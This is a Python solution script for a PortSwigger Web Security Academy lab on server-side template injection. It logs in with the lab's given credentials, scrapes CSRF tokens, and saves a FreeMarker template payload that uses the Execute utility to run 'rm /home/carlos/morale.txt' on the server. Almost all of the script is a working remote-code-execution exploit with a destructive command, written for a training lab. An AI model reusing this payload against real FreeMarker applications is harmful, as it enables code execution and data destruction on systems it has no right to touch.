#!/usr/bin/env python

'''This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.
You can log in to your own account using the following credentials:

content-manager:C0nt3ntM4n4g3r

Lab link: https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation
'''

import requests
from bs4 import BeautifulSoup


s = requests.session()

lab_id = '0a3e005c038cfb5d80483fe9004a00c8' #change based on generated lab

# login as content-manager:C0nt3ntM4n4g3r as provided in the instructions
uri = f"https://{lab_id}.web-security-academy.net/login"
r = s.get(uri) 

soup = BeautifulSoup(r.text, 'lxml')
token = soup.find('input', {'name': 'csrf'})['value'] #login csrf token
# Submit this data in next the post request to login
data = { 'username' : "content-manager",
        'password' : "C0nt3ntM4n4g3r",
        'csrf': token
}
r2 = s.post(uri, data=data)

# Once logged in, go to an edit template page
uri = f"https://{lab_id}.web-security-academy.net/product/template?productId=1"
r3 = s.get(uri)

soup = BeautifulSoup(r3.text, 'lxml')
token = soup.find('input', {'name': 'csrf'})['value'] #template change csrf token

# Template framework is apache Freemarker. There is an execute class we can use to run code
# As detailed here in the documentation: https://freemarker.apache.org/docs/api/freemarker/template/utility/Execute.html

# Post our malicous payload
data = { 'csrf': token,
        'template' : '${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}',
        'template-action' : "save"
}
r4 = s.post(uri, data=data)

# Now view the page we just edited to finish
uri = f"https://{lab_id}.web-security-academy.net/product?productId=1"
r5 = s.get(uri)
if "Congratulations" in r5.text:
    print("solved")
else:
    print("nope")
    print(r5.text)